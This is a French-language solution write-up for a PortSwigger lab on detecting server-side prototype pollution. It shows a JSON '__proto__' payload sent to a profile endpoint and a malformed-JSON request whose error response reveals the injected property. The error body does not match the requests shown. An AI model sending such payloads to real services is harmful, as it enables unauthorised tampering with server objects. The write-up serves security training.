# Lab

https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection

## Solution

L'objectif de ce lab est d'effectuer une pollution de prototype côté serveur sans utiliser de réflexion de propriété polluée.

C'est à dire que nous devons trouver un moyen de polluer le prototype des objets côté serveur et d'en voir les résultats.

Comme le lab précédent [Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution), on peut utiliser la requête de modification de profil pour effectuer la pollution de prototype.

```html
POST /my-account/change-address HTTP/2
Host: 0a7200bc0321c0ad803ebccd001b0097.web-security-academy.net
Cookie: session=lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH
Content-Length: 83
Content-Type: application/json;charset=UTF-8

{
    "sessionId":"lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH",
    "__proto__": {
        "foo": "bar"
    }
}
```

Cependant, contrairment au lab précédent, la réponse ne contient pas la propriété `foo`:

```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c5-o6PbsdZgCxd7ROzSod5GR7NXS6Q"
Date: Fri, 05 Jan 2024 11:36:28 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 197

{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": false
}
```

Pour voir si la pollution a bien fonctionné, on peut provoquer une erreur côté serveur de sérialisation de l'objet `req` en envoyant un JSON mal formé:

```html
POST /my-account/change-address HTTP/2
Host: 0a7200bc0321c0ad803ebccd001b0097.web-security-academy.net
Cookie: session=lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH
Content-Length: 83
Content-Type: application/json;charset=UTF-8

{toto}
```

Et dans la réponse on voit bien la propriété `foo`:

```http
HTTP/2 500 Internal Server Error
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Etag: W/"177-Mb72lbb/R0ZZoYRmopsJJSIRE2c"
Date: Fri, 05 Jan 2024 11:39:05 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 375

{
  "error": {
    "expose": true,
    "statusCode": 101,
    "status": 101,
    "body": "{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"UK\",\"sessionId\":\"xKO4TE1UcBE4eE0GkmjKSOG6ts6dYrtN\",\"__proto__\": {\r\n        \"status\":101\r\n    }hgj}",
    "type": "entity.parse.failed",
    "foo": "bar"
  }
}
```

Et le lab se valide en visualisant cette erreur avec la pollution effective.